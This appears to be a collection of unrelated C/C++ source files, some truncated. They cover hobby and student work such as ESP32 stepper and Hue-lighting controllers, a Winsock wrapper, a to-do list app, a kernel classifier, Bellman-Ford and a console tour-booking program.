    "#include <Arduino.h>\n#include <AccelStepper.h>\n#include <MultiStepper.h>\n\n#define PPM_PIN 15 \n\nconst int stepsPerRevolution = 32000;  \nconst int stepsPerDegree = stepsPerRevolution / 360;  \n\nconst int LstepPin = 22;\nconst int LdirPin = 18;\nconst int LenablePin = 25;\n\nconst int RstepPin = 23;\nconst int RdirPin = 19;\nconst int RenablePin = 26;\n\nvolatile uint32_t lastTime = 0;\nvolatile uint32_t currentTime = 0;\nvolatile uint16_t ppmValues[8]; \nvolatile uint8_t channel = 0;\n\nAccelStepper stepperLeft(AccelStepper::DRIVER, LstepPin, LdirPin);\nAccelStepper stepperRight(AccelStepper::DRIVER, RstepPin, RdirPin);\n\nMultiStepper steppers;\n\nint calculateAngle(uint16_t ppmValue) {\n  if (ppmValue >= 1550 && ppmValue <= 2000) {\n    return map(ppmValue, 1550, 2000, -40, 0); \n  } else if (ppmValue >= 1000 && ppmValue <= 1450) {\n    return map(ppmValue, 1000, 1450, 0, 40); \n  } else if (ppmValue > 1450 && ppmValue < 1550) {\n    return 0;\n  } else {\n    return 0;\n  }\n}\n\nvoid IRAM_ATTR handlePPMInterrupt() {\n  currentTime = micros(); \n  uint32_t pulseLength = currentTime - lastTime;\n  lastTime = currentTime;\n\n  if (pulseLength > 3000) {\n    channel = 0;\n  } else {\n    if (channel < 8) {\n      ppmValues[channel] = pulseLength;\n      channel++;\n    }\n  }\n}\n\nvoid setup() {\n  Serial.begin(115200);\n  pinMode(PPM_PIN, INPUT_PULLUP);\n  attachInterrupt(digitalPinToInterrupt(PPM_PIN), handlePPMInterrupt, FALLING);\n\n  pinMode(LenablePin, OUTPUT);\n  pinMode(RenablePin, OUTPUT);\n\n  digitalWrite(LenablePin, LOW);\n  digitalWrite(RenablePin, LOW);\n\n  stepperLeft.setMaxSpeed(1500);\n  stepperLeft.setAcceleration(500);\n\n  stepperRight.setMaxSpeed(1500);\n  stepperRight.setAcceleration(500);\n\n  steppers.addStepper(stepperLeft);\n  steppers.addStepper(stepperRight);\n}\n\nvoid moveStepperMotor(int angle) {\n  int stepsToMove = angle * stepsPerDegree;\n  long positions[2];\n\n  positions[0] = stepsToMove;\n  positions[1] = stepsToMove;\n\n  steppers.moveTo(positions);\n  steppers.runSpeedToPosition(); \n}\n\nvoid loop() {\n  uint16_t ppmValue = ppmValues[0];\n\n  int angle = calculateAngle(ppmValue);\n\n  Serial.print(\"PPM Value: \");\n  Serial.print(ppmValue);\n  Serial.print(\", Calculated Angle: \");\n  Serial.println(angle);\n\n  moveStepperMotor(angle);\n\n  delay(10); \n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Zombie.cpp                                         :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: seungryk <seungryk@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/07/01 14:43:53 by seungryk          #+#    #+#             */\n/*   Updated: 2024/07/01 15:56:51 by seungryk         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Zombie.hpp\"\n\nZombie::Zombie(){\n    std::cout << \"Zombie created!\" << std::endl;\n}\n\nZombie::~Zombie(){\n    std::cout << \"Zombie \" << _name << \" deleted\" << std::endl;\n}\n\nvoid    Zombie::announce( void ){\n    std::cout << _name << \": BraiiiiiiinnnzzzZ...\" << std::endl;\n}\n\nvoid    Zombie::set_name(std::string name){\n    _name = name;\n}\n",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int limit;\r\n    cin>>limit;\r\n    while(limit--)\r\n    {\r\n        int n,k;\r\n        cin>>n>>k;\r\n        int arr[n],sm_size=0,uni_count=1;\r\n        unordered_map<int,vector<int>>ump;\r\n        int ans[n];\r\n        for(int i=0; i<n; i++)\r\n        {\r\n            cin>>arr[i];\r\n            ump[arr[i]].push_back(i);\r\n        }\r\n\r\n        for(auto it: ump)\r\n        {\r\n            if(it.second.size() < k)\r\n                sm_size += it.second.size();\r\n        }\r\n        int iterator = k*(sm_size/k);\r\n\r\n        for(auto it: ump)\r\n        {\r\n            if(it.second.size() >= k)\r\n            {\r\n                int count=1,flag=1;\r\n                for(auto index: it.second)\r\n                {\r\n                    if(count > k)\r\n                    {\r\n                        count=0;\r\n                        flag=0;\r\n                    }\r\n                    ans[index]=count;\r\n                    if(flag==1)\r\n                        count++;\r\n                }\r\n            }\r\n            else\r\n            {\r\n                for(auto index: it.second)\r\n                {\r\n                    if(iterator)\r\n                    {\r\n                        if(uni_count > k)\r\n                            uni_count=1;\r\n\r\n                        ans[index] = uni_count;\r\n                        uni_count++;\r\n                        iterator--;\r\n                    }\r\n                    else\r\n                        ans[index]=0;\r\n                }\r\n            }\r\n        }\r\n        for(auto it: ans)\r\n            cout<<it<<\" \";\r\n        cout<<'\\n';\r\n        ump.clear();\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"tcpNetworkManager.h\"\n#include \"ClientResponse.h\"\n#include \"ServerQueries.h\"\n#include \"clientManager.h\"\n#include <thread>\n#include <string>\n\n\n#define NumOfClientsSupported 50\n\nnamespace mysocket {\n\n\t/* Error Handlers for winsocket API's */\n\tvoid WinSocket::Err_handle_WSAStartup(const int &err_code) {\n\t\tif (err_code != 0) {\n\t\t\tswitch (err_code)\n\t\t\t{\n\t\t\tcase WSASYSNOTREADY:\t\tstd::cerr << \"WSAStartup() : The underlying network subsystem is not ready for network communication\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAVERNOTSUPPORTED:\tstd::cerr << \"WSAStartup() : The version of Windows Sockets support requested is not provided by this particular Windows Sockets implementation\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEINPROGRESS:\t\tstd::cerr << \"WSAStartup() : A blocking Windows Sockets 1.1 operation is in progress\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEPROCLIM:\t\t\tstd::cerr << \"WSAStartup() : A limit on the number of tasks supported by the Windows Sockets implementation has been reached\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEFAULT:\t\t\t\tstd::cerr << \"WSAStartup() : WSAStartup error : The lpWSAData parameter is not a valid pointer\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tdefault:\t\t\t\t\tstd::cerr << \"WSAStartup() : This error code doesn't exist\" << std::endl; exit(EXIT_FAILURE);\n\t\t\t}\n\t\t}\n\t}\n\tvoid WinSocket::Err_handle_getaddrinfo(const int &err_code) {\n\t\tif (err_code != 0) {\n\t\t\tswitch (err_code)\n\t\t\t{\n\t\t\tcase EAI_AGAIN:\t\tstd::cerr << \"getaddrinfo() : A temporary failure in name resolution occurred\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase EAI_BADFLAGS:\tstd::cerr << \"getaddrinfo() : An invalid value was provided for the ai_flags member of the pHints parameter\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase EAI_FAIL:\t\tstd::cerr << \"getaddrinfo() : A nonrecoverable failure in name resolution occurred\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase EAI_FAMILY:\tstd::cerr << \"getaddrinfo() : The ai_family member of the pHints parameter is not supported\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase EAI_MEMORY:\tstd::cerr << \"getaddrinfo() : A memory allocation failure occurred\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase EAI_NONAME:\tstd::cerr << \"getaddrinfo() : The name does not resolve for the supplied parameters or the pNodeName and pServiceName parameters were not provided\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase EAI_SERVICE:\tstd::cerr << \"getaddrinfo() : The pServiceName parameter is not supported for the specified ai_socktype member of the pHints parameter\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase EAI_SOCKTYPE:\tstd::cerr << \"getaddrinfo() : The ai_socktype member of the pHints parameter is not supported\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tdefault:\t\t\tstd::cerr << \"getaddrinfo() : This error code doesn't exist\" << std::endl; exit(EXIT_FAILURE);\n\t\t\t}\n\t\t}\n\t}\n\tvoid WinSocket::Err_handle_socket(const SOCKET &ret_val) {\n\t\tif (ret_val == INVALID_SOCKET)\n\t\t{\n\t\t\tconst int &err_code = WSAGetLastError();\n\t\t\tswitch (err_code)\n\t\t\t{\n\t\t\tcase WSANOTINITIALISED:\t\tstd::cerr << \"socket() : A 0ful WSAStartup call must occur before using this function\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAENETDOWN:\t\t\tstd::cerr << \"socket() : The network subsystem or the associated service provider has failed\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEAFNOSUPPORT:\t\tstd::cerr << \"socket() : The specified address family is not supported. For example, an application tried to create a socket for the AF_IRDA address family but an infrared adapter and device driver is not installed on the local computer\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEINPROGRESS:\t\tstd::cerr << \"socket() : A blocking Windows Sockets 1.1 call is in progress, or the service provider is still processing a callback function\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEMFILE:\t\t\t\tstd::cerr << \"socket() : No more socket descriptors are available\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEINVAL:\t\t\t\tstd::cerr << \"socket() : An invalid argument was supplied. This error is returned if the af parameter is set to AF_UNSPEC and the type and protocol parameter are unspecified\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEINVALIDPROVIDER:\tstd::cerr << \"socket() : The service provider returned a version other than 2.2\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEINVALIDPROCTABLE:\tstd::cerr << \"socket() : The service provider returned an invalid or incomplete procedure table to the WSPStartup\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAENOBUFS:\t\t\tstd::cerr << \"socket() : No buffer space is available. The socket cannot be created\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEPROTONOSUPPORT:\tstd::cerr << \"socket() : The specified protocol is not supported\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEPROTOTYPE:\t\t\tstd::cerr << \"socket() : The specified protocol is the wrong type for this socket\" << std::endl; exit(EXIT_FAILURE);\n\t\t\tcase WSAEPROVIDERFAILEDINIT:std::cerr << \"socket() : The service provider failed to initialize. This error is returned if a layered ",
    "#include <iostream>\r\n#include <fstream>\r\n#include <chrono>\r\n#include <iomanip>\r\n#include <ctime>\r\n#include \"json.hpp\"\r\nusing namespace nlohmann;\r\nusing namespace std;\r\n\r\nstruct Node {\r\n    int id;\r\n    string info;\r\n    string date;\r\n    Node* next;\r\n};\r\nNode* head = NULL;\r\n\r\nstring getDate();\r\nvoid addTodo(string todo_info);\r\nvoid removeTodo(int todo_id);\r\nvoid updateId();\r\nvoid displayTodoList();\r\nvoid updateJsonFile();\r\nvoid updateList();\r\n\r\nint main() {\r\n    updateList();\r\n    removeTodo(8);\r\n    updateJsonFile();\r\n    displayTodoList();\r\n}\r\n\r\nstring getDate() {\r\n    auto now = chrono::system_clock::now();\r\n    time_t current_time = chrono::system_clock::to_time_t(now);\r\n    tm* timeinfo = localtime(&current_time);\r\n\r\n    string date = to_string(timeinfo->tm_mday) + \"/\"\r\n                  + (timeinfo->tm_mon < 9 ? \"0\" : \"\") \r\n                  + to_string(1 + timeinfo->tm_mon) \r\n                  + \"/\" + to_string(1900 + timeinfo->tm_year);\r\n\r\n    return date;                  \r\n}\r\n\r\nvoid addTodo(string todo_info) {\r\n    Node* newTodo = new Node;\r\n    newTodo->info = todo_info;\r\n    newTodo->date = getDate();\r\n\r\n    int todo_id = 1;\r\n\r\n    if (head == NULL) {\r\n        head = newTodo;\r\n        newTodo->next = NULL;\r\n        newTodo->id = todo_id;\r\n    } else {\r\n        Node* current = head;\r\n        while (current->next != NULL) {\r\n            current = current->next;\r\n            todo_id++;\r\n        }\r\n        current->next = newTodo;\r\n        newTodo->next = NULL;\r\n        newTodo->id = todo_id + 1;\r\n    }\r\n}\r\n\r\nvoid removeTodo(int todo_id) {\r\n    if (head == NULL) {\r\n        cout << \"There is No Todo in the List!\\n\";\r\n    } else {\r\n        Node* current = head;\r\n        Node* prev = head;\r\n        while (current != NULL && current->id != todo_id) {\r\n            prev = current;\r\n            current = current->next;\r\n        }\r\n        if (current == NULL) {\r\n            cout << \"The Todo not found in the List!\\n\";\r\n            return;\r\n        }\r\n\r\n        prev->next = current->next;\r\n        delete current;\r\n        current = NULL;\r\n\r\n        updateId();\r\n    }\r\n}\r\n\r\nvoid updateId() {\r\n    if (head != NULL) {\r\n        Node* current = head;\r\n        int todo_id = 1;\r\n        while (current != NULL) {\r\n            current->id = todo_id;\r\n            current = current->next;\r\n            todo_id++;\r\n        }\r\n    }\r\n}\r\n\r\nvoid displayTodoList() {\r\n    if (head == NULL) {\r\n        cout << \"There is No Todo in the List!\\n\";\r\n    } else {\r\n        Node* current = head;\r\n        while (current != NULL) {\r\n            cout << \"ID: \" << current->id << \"\\n\";\r\n            cout << \"Todo: \" << current->info << \"\\n\";\r\n            cout << \"Date: \" << current->date << \"\\n\";\r\n            cout << \"----------------------------------\\n\";\r\n            current = current->next;\r\n        }\r\n    }\r\n}\r\n\r\nvoid updateJsonFile() {\r\n    ofstream todo_DB(\"./toDoListDB.json\");\r\n    json newJson;\r\n    newJson[\"ToDoList\"] = json::array();\r\n\r\n    if (head == NULL) {\r\n        todo_DB << newJson;\r\n    } else {\r\n        Node* current = head; \r\n        while (current != NULL) {\r\n            newJson[\"ToDoList\"].push_back({\r\n                {\"ID\", current->id}, \r\n                {\"ToDo\", current->info}, \r\n                {\"Date\", current->date}\r\n            });\r\n            current = current->next;\r\n        }\r\n        todo_DB << setw(4) << newJson;\r\n    }\r\n}\r\n\r\nvoid updateList() {\r\n    ifstream jsonFile(\"./toDoListDB.json\");\r\n    json jsonData = json::parse(jsonFile);\r\n    \r\n    auto todoList = jsonData[\"ToDoList\"];\r\n\r\n    for (const auto& todo : todoList) {\r\n        Node* newTodo = new Node;\r\n        newTodo->id = todo[\"ID\"];\r\n        newTodo->info = todo[\"ToDo\"];\r\n        newTodo->date = todo[\"Date\"];\r\n\r\n        if (head == NULL) {\r\n            head = newTodo;\r\n            newTodo->next = NULL;\r\n        } else {\r\n            Node* current = head;\r\n            while (current->next != NULL) {\r\n                current = current->next;\r\n            }\r\n            current->next = newTodo;\r\n            newTodo->next = NULL;\r\n        }\r\n    }\r\n}\r\n",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <ctime>\n#pragma warning(disable : 4996)\nusing namespace std;\n// \u043f\u0430\u0440\u0437. \u043e\u043a\u043d\u043e \u0441 \u0444\u0438\u043a\u0441. h, \u043f\u0440\u044f\u043c\u043e\u0443\u0433 K(x) = [r <= 1], 2 \u0444\u0430\u0439\u043b\nconst int N = 10000, r = 75, Nl = N * r / 100;\nclass obj\n{\nprivate:\n    int mih, s;\n    double S;\n\npublic:\n    int c;\n    obj() : mih(0), s(0), c(-1), S(-1)\n    {\n\n    }\n    obj(int mih, int s) : mih(mih), s(s), c(-1), S(-1)\n    {\n\n    }\n    obj(char* str) : S(-1)\n    {\n        sscanf(str, \"%d,%d,%d\", &mih, &s, &c);\n    }\n\n    void print()\n    {\n        cout << \" mih = \" << mih << \", s = \" << s << \", c = \" << c << endl;\n    }\n\n    void dist(obj a)\n    {\n        S = sqrt(pow(a.mih - mih, 2) + pow(a.s - s, 2));\n    }\n\n    int K(int h)\n    {\n        double rr = S / h;\n        if (rr <= 1)\n            return 1;\n        else\n            return 0;\n    }\n};\n\nint classif(obj X[N], int h, int L, int R, int ind = -1)\n{\n    int i, y0 = 0, y1 = 0;\n    for (i = L; i < R; i++)\n    {\n        if (i == ind)\n            continue;\n        if (X[i].c == 0)\n            y0 += X[i].K(h);\n        else\n            y1 += X[i].K(h);\n    }\n    if (y0 > y1)\n        return 0;\n    else\n        return 1;\n}\n\nvoid shuf(obj X[N], int L = 0, int R = N, int n = N, int rnd = 0)\n{\n    obj obm;\n    int i, j;\n    for (i = L; i < R; i++)\n    {\n        j = rnd + rand() % n;\n        obm = X[i];\n        X[i] = X[j];\n        X[j] = obm;\n    }\n}\n\nvoid sort(obj X[N])\n{\n    obj obm;\n    int i, j, k;\n    for (i = 0; i < N - 1; i++)\n    {\n        k = i;\n        for (j = i + 1; j < N; j++)\n        {\n            if (X[k].c < X[j].c)\n                k = j;\n        }\n        if (k != i)\n        {\n            obm = X[i];\n            X[i] = X[k];\n            X[k] = obm;\n        }\n    }\n}\n\nvoid fill_X(obj X[N])\n{\n    ifstream f(\"..\\\\..\\\\data2.csv\");\n    obj obm;\n    char str[256];\n    int i, j, k, L = Nl * (100 - r) / 100;\n    for (i = -1; i < N; i++)\n    {\n        f >> str;\n        if (i >= 0)\n            X[i] = obj(str);\n    }\n    f.close();\n    shuf(X);\n    sort(X);\n    for (i = Nl - L, j = N - 1; i < Nl; i++, j--)\n    {\n        obm = X[i];\n        X[i] = X[j];\n        X[j] = obm;\n    }\n    shuf(X, 0, Nl, Nl);\n    shuf(X, Nl, N, N - Nl, Nl);\n}\n\nint main()\n{\n    srand(time(0));\n    setlocale(LC_ALL, \"Russian\");\n    obj X[N];\n    int i, j, n = 0, n0 = 0, h = 0;\n    fill_X(X);\n    do\n    {\n        h++;\n        n0 = n;\n        n = 0;\n        for (i = 0; i < Nl; i++)\n        {\n            for (j = 0; j < Nl; j++)\n            {\n                if (i != j)\n                    X[j].dist(X[i]);\n            }\n            if (classif(X, h, 0, Nl, i) != X[i].c)\n                n++;\n        }\n        cout << \" \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043e\u0448\u0438\u0431\u043e\u043a \u043e\u0431\u0443\u0447\u0430\u044e\u0449\u0435\u0439 \u0432\u044b\u0431\u043e\u0440\u043a\u0438 \u043f\u0440\u0438 h = \" << h << \": \" << n << endl;\n    } while ((n == 0) || (n0 == 0) || (n0 > n));\n\n    h--;\n    cout << \" h = \" << h << \", \" << n * 100 / Nl << \"% \u043e\u0448\u0438\u0431\u043e\u043a\" << endl;\n    n = 0;\n    for (i = Nl; i < N; i++)\n    {\n        for (j = Nl; j < N; j++)\n        {\n            if (i != j)\n                X[j].dist(X[i]);\n        }\n        if (classif(X, h, Nl, N, i) != X[i].c)\n            n++;\n    }\n    cout << \" \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043e\u0448\u0438\u0431\u043e\u043a \u0442\u0435\u0441\u0442\u043e\u0432\u043e\u0439 \u0432\u044b\u0431\u043e\u0440\u043a\u0438: \" << n << \", \" << n * 100 / (N - Nl) << \"% \u043e\u0448\u0438\u0431\u043e\u043a\";\n    return 0;\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <climits>\r\n\r\nusing namespace std;\r\n\r\n// Function to perform the Bellman-Ford algorithm\r\nvoid bellmanFord(vector<vector<int>>& edges, int V, int E, int src) {\r\n    // Distance vector to store the shortest path distance from src to each vertex\r\n    vector<int> dist(V, INT_MAX);\r\n\r\n    // Initialize distance of source vertex to 0\r\n    dist[src] = 0;\r\n\r\n    // Relax all edges |V| - 1 times\r\n    for (int i = 1; i <= V - 1; ++i) {\r\n        for (int j = 0; j < E; ++j) {\r\n        int u = edges[j][0];\r\n        int v = edges[j][1];\r\n        int weight = edges[j][2];\r\n        if (dist[u] != INT_MAX && dist[u] + weight < dist[v]) {\r\n           dist[v]=dist[u] + weight ;\r\n        }\r\n    }\r\n    }\r\n\r\n    // Check for negative-weight cycles\r\n    for (int j = 0; j < E; ++j) {\r\n        int u = edges[j][0];\r\n        int v = edges[j][1];\r\n        int weight = edges[j][2];\r\n        if (dist[u] != INT_MAX && dist[u] + weight < dist[v]) {\r\n            cout << \"Graph contains negative weight cycle\" << endl;\r\n            return;\r\n        }\r\n    }\r\n\r\n    // Print the calculated shortest distances\r\n    cout << \"Vertex Distance from Source (\" << src << \"):\" << endl;\r\n    for (int i = 0; i < V; ++i) {\r\n        if (dist[i] == INT_MAX) {\r\n            cout << i << \" : INF\" << endl;\r\n        } else {\r\n            cout << i << \" : \" << dist[i] << endl;\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    int V, E;\r\n    cout << \"Enter number of vertices: \";\r\n    cin >> V;\r\n    cout << \"Enter number of edges: \";\r\n    cin >> E;\r\n\r\n    // Edges represented as a vector of vectors\r\n    // Each edge is represented as a vector of three integers: (u, v, weight)\r\n    vector<vector<int>> edges(E, vector<int>(3));\r\n\r\n    cout << \"Enter edges (u v weight):\" << endl;\r\n    for (int i = 0; i < E; ++i) {\r\n        cin >> edges[i][0] >> edges[i][1] >> edges[i][2];\r\n    }\r\n\r\n    int src;\r\n    cout << \"Enter source vertex: \";\r\n    cin >> src;\r\n\r\n    bellmanFord(edges, V, E, src);\r\n\r\n    return 0;\r\n}\r\n",
    "#include<iostream>\n#include<fstream>\n#include<iomanip>  //for float precision points\n#include<windows.h> //for sleep function \n#include<string>\n\nusing namespace std;\nvoid menue(int a=0);\n\n\nclass admin \n{\n   private:\n        string usernameadmin;\n        string password;\n    public:\n        admin()\n        {\n            usernameadmin = \"amen\";\n            password = \"123\";\n\n        }\n        friend class manageMenue;\n};\n\nclass manageMenue\n{\n\n   private:\n        admin a;\n\n\n        string username; // hide admin name\n\n    public:\n      \n        manageMenue()  // constructor\n        {\n            system(\"title Happy Trails Tours\");\n            system(\"mode con: cols=142 lines=34\"); // setting the size of the app window\n            system(\"color 0A\");                    // change color\n            system(\"echo \\a\");                     // sound\n\n            cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t Press 1 if you are an Admin: \\n\\t Press 2 if you are a Customer: \";\n           \n            int c;\n            cin>>c;\n          system(\"cls\");\n\n\n            if(c==1)\n       {\n           cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t ADMIN LOGIN\\n\\t \\n\";\n           cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t Username: \";\n           cin >> a.usernameadmin;\n\n           cout << \"\\n\\t Password: \";\n           cin >> a.password;\n\n           if (a.usernameadmin == \"amen\" && a.password == \"123\")\n           {\n               system(\"cls\");\n               menue(0);\n     } \n     else\n     {\n        system(\"cls\");\n        cout<<\"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t Invalid username or password\"<<endl;\n       Sleep(999);\n       system(\"cls\");\n       manageMenue();}\n\n        \n       \n       }\n\n\n        else if (c==2)\n        {\n               cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t Enter Your Name to Continue as as a Customer : \";\n        cin >> username;\n         system(\"cls\");\n       menue(1);\n        }\n        else\n        {\n            cout<<\"Invalid choice\"<<endl;\n            system(\"cls\");\n            manageMenue();\n    }\n    }\n    ~manageMenue()\n    {\n        \n    }\n\n};\n\n\n\nclass customers{\npublic:\n string name,gender, address;\n int age, mobileNo;\n static int cutomerId;\n \n //to print all values using file handlingin showDetails() function\n customers()   //constructor\n {\n   name=\"\";\n   gender=\"\";\n    address=\"\";\n    age=0;\n    mobileNo=0;\n    getCustomerId();\n\n\n }\n static void getCustomerId()\n {\n      cutomerId++;\n }\n void getDetails()\n { \n     \n     ofstream out(\"old-customer.tx\",ios::app);\n     \n         \n        customers::cutomerId++;\n         cout << \"Enter Cutomer name: \";\n         cin >> name;\n         cout << \"Enter address: \";\n         cin >> address;\n         cout << \"Enter Age:  \";\n         cin >> age;\n         cout << \"Enter Mobile No: \";\n         cin >> mobileNo;\n         cout << \"Enter gender: \";\n         cin >> gender;\n     \n     out << endl\n         << \"Cutomer ID:\" << cutomerId << endl\n         << \"Name:\" << name << endl\n         << \"Age: \" << age << endl\n         << \"Mobile Number: \" << mobileNo << endl\n         << \"Address: \" << address << endl\n         << \"Gender: \" << gender << endl;\n     out.close();\n     cout << \"\\nSAVED SUCCESSFULLY\\n NOTE:we saved your details for future purpose\\n\"\n          << endl;\n\n\n\n}\nvoid ShowDetails()\n{\n    ifstream in(\"old-customer.tx\");\n    if (!in)\n    {\n        cout << \"File not found\" << endl;\n        return; // Exit the function since the file couldn't be opened\n    }\n    else\n    {\n        char allInfo[1000]; // Declaration of allInfo variable\n        while (in.getline(allInfo, 999))\n        {\n            cout << allInfo << endl;\n        }\n        in.close();\n    }\n}\n\n};\nint customers::cutomerId = 0;\n\n\n\n\n\n\n\n\n\n\n\nclass cab{\n\n public:\n int cabChoice;\n int kilometers;\n static float price;\n float lastcabcost;\n string cabbok;\n\n\n\n    cab() //constructor\n    {\n        cabChoice=0;\n        kilometers=0;\n        price=0;\n        lastcabcost=0;\n        cabbok=\"\";\n    }\n void cabDetails()\n {\n    cout<<\"1. Micro\"<<endl;\n    cout<<\"2. Mini\"<<endl;\n    cout<<\"3. Prime\"<<endl;\n    cout<<\"Enter your choice: \";\n    cin>>cabChoice;\n    cout<<\"Enter the distance in kilometers: \";\n    cin>>kilometers;\n    int hirecab;\n\n\n    if(cabChoice==1)\n    {\n        price=kilometers*10;\n        cout<<\"Your total fare is: \"<<price<<endl;\n        cout<<\"Your total fare is: \"<<price<<endl;\n        cout << \"Press 1 to hire the cab\\n\";\n         cout << \"Press 2 to select another cab\\n\";\n         cin >> hirecab;\n\n         system(\"cls\");\n         if(hirecab == 1)\n         {  lastcabcost=price;\n             cout << \"Your cab is booked\\n\";\n             cout << \"Your cab will arrive soon\\n\";\n             cout << \"Thank you for using our service\\n\";\n             cout << \"Goto Menue and take the recipt;\"<<endl;\n             cabbok=\"Micro\";\n\n         }\n         else if(hirecab == 2)\n         {\n             cabDetails();\n         }\n         else\n         {\n             cout << \"Invalid choice, Redurecting to previous Menue.\\n Please wait!\" << endl;\n            ",
    "/* External headers */\n#include <Arduino.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n#include <Arduino_JSON.h>\n#include <LittleFS.h>\n#include <vector>\n\n/* Headers that are part of this project */\n#include \"hue/HueService.hpp\"\n#include \"hue/HueLightService.hpp\"\n#include \"hue/HueEventService.hpp\"\n#include \"network/WiFiSetupService.hpp\"\n#include \"network/ElprisenRESTService.hpp\"\n#include \"hardware/RGBControl.hpp\"\n#include \"utils/TimeHandler.hpp\"\n#include \"utils/WiFiUtils.hpp\"\n#include \"utils/ConfigService.hpp\"\n\n/* Declare all services used in the program, initialized on setup and reused throughout */\nHueService* hueService;\nHueLightService* hueLightService;\nConfigService* configService;\nHueEventService* hueEventService;\nWiFiSetupService* wifiSetupService;\nElprisenRESTService* elprisenRESTService;\n\n/* Define colors and prices */\nconst uint8_t red[3] = {255,0,0};\nconst uint8_t blue[3] = {0,0,255};\nconst uint8_t green[3] = {0,255,0};\nconst uint8_t white[3] = {255,255,255};\nconst uint8_t purple[3] = {156,0,156};\n\n// TODO: Would like this to be setup from WiFiSetupService and saved to Preferences through the ConfigService\n//       Colors would be nice to define with a color picker on the WiFi setup for each color, at least for the prices.\nconst double priceHigh = 1.7;\nconst double priceMedium = 0.5;\nconst double priceLow = 0.05; // anything below this is colorPriceVeryLow\n\nconst uint8_t* colorPriceHigh = red;\nconst uint8_t* colorPriceMedium = blue;\nconst uint8_t* colorPriceLow = green;\nconst uint8_t* colorPriceVeryLow = white;\n\n/* Shared timeinfo */\nstruct tm timeinfo;\n\n/* Hardware */\nconst int USER_RESET_BTN = 27;\n\n/* Blinking for missing WiFi */\nunsigned long lastBlinkTime = 0;\nbool blinkState = false;\n\n/* NTP Server timer */\nunsigned long lastNTPUpdateTime = 0;\nunsigned long ntpUpdateInterval = 24 * 60 * 60 * 1000; // 24 hours in milliseconds for updating the time from NTP\n\n/* Setup the main update time for the lights. How often should it check the bridge for new lights in the room */\nunsigned long lastLightsCheck = 0;\nunsigned long minutesBetweenLightUpdates = 2;  // Update every 2 minutes\nunsigned long timerDelayLights = minutesBetweenLightUpdates * 60 * 1000;\n\n/* Provisioning setup, if bridge has not recognized the ESP32 */\nunsigned long provisioningInterval = 5000;  // Check every 5 seconds for provisioning (Getting API key from the Hue through button press)\nunsigned long blinkIntervalProvisioning = 250;          // Blink every 250 ms if the button needs to be pressed on the Hue Bridge\nbool provisioned = false;\nunsigned long lastProvisionCheck = 0;\n\n/* Temp name for the room, will try to load this from config file, part of initial setup */\nString roomName = \"Str\u00f8m er dyrt\";  // Room name to monitor, this is the default name, must be set when setting up WiFi\n\n/* ID used for updating all lights in the room easily. From that fetch the light service on that. */\nString currentGroupedLightID; \n\nvoid setColorBasedOnPrice(double price) {\n  if (currentGroupedLightID == \"\") return;\n\n  if (price > priceHigh) {\n    hueLightService->lightControlRGB(hueService->getIP(), currentGroupedLightID, colorPriceHigh);  \n    setNeopixelColorRGB(colorPriceHigh);\n  } else if (price > priceMedium) {\n    hueLightService->lightControlRGB(hueService->getIP(), currentGroupedLightID, colorPriceMedium); \n    setNeopixelColorRGB(colorPriceMedium);\n  } else if (price > priceLow) {\n    hueLightService->lightControlRGB(hueService->getIP(), currentGroupedLightID, colorPriceLow);  \n    setNeopixelColorRGB(colorPriceLow);\n  } else {\n    hueLightService->lightControlRGB(hueService->getIP(), currentGroupedLightID, colorPriceVeryLow);\n    setNeopixelColorRGB(colorPriceVeryLow);\n  }\n}\n\nvoid provisioningBlink() {\n  unsigned long currentTime = millis();\n  if (currentTime - lastBlinkTime >= blinkIntervalProvisioning) {\n    if (blinkState) {\n      setNeopixelColorRGB(red);  \n    } else {\n      setNeopixelColorRGB(blue);  \n    }\n    blinkState = !blinkState;\n    lastBlinkTime = currentTime;\n  }\n}\n\nvoid resetPreferences() {\n  Preferences preferences;\n  preferences.begin(\"wifi\", false);\n  preferences.clear();\n  preferences.end();\n  